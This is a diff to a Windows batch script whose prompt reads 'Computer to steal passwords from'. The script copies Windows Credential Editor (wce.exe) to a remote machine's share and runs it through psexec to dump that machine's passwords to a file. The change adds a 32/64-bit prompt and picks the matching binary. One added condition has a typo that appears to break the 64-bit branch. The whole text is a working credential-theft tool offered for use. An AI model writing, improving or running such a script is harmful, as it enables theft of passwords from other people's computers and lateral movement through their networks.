@@ -9,6 +9,9 @@ echo     \__/\  /  \______  /____^|      \/\_/^|___^|  /
 echo          \/          \/                      \/ 
 echo.
 set /p rc=Computer to steal passwords from:
+:goback
+set /p rcarc=Is this computer 32 or 64 bit: 
+if NOT "%rcarc%" == "32" if NOT "%rcarc%" == "64" goto goback
 if "%rc%" == "" goto begin
 echo Removing previous mounts to x:
 net use x: /delete >nul 2>&1
@@ -31,7 +34,8 @@ x:
 cd /
 mkdir rc
 c:
-copy wce.exe x:\rc\wce.exe
+if "%rcarc" == "64" copy wce.exe x:\rc\wce.exe
+if "%rcarc" == "32" copy wce32.exe x:\rc\wce.exe
 psexec \\%rc% C:\rc\wce.exe -w >>%rc%-%random%.txt
 copy x:\rc\%rc%.txt %rc%.txt
 x:
